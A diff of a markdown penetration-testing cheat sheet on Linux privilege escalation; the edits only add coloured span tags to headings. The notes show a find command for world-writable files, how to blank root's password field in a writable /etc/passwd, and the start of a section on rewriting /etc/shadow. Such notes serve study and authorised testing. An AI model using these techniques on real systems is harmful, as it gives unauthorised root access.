@@ -1,11 +1,11 @@
 
-# Find World-Writable Files
+# <span style="color:#FF5555">Find World-Writable Files</span>
 ```bash
 find / -not -type l -perm -o+w 2>/dev/null
 ```
 
 
-## /etc/passwd
+## <span style="color:#8BE9FD">/etc/passwd</span>
 
 If we have write permission of /etc/passwd by some means, we can modify this file as desired for us. First check the content of that file with cat /etc/passwd.
 ```bash
@@ -16,7 +16,7 @@ By removing this x character in the root line, we can become root without passwo
 root::0:0:root:/root:/bin/sh
 ```
 
-## /etc/shadow
+## <span style="color:#8BE9FD">/etc/shadow</span>
 
 If we have write permission of /etc/shadow by some means, we can modify the password for each user.
 First of all, create a new password using openssl.
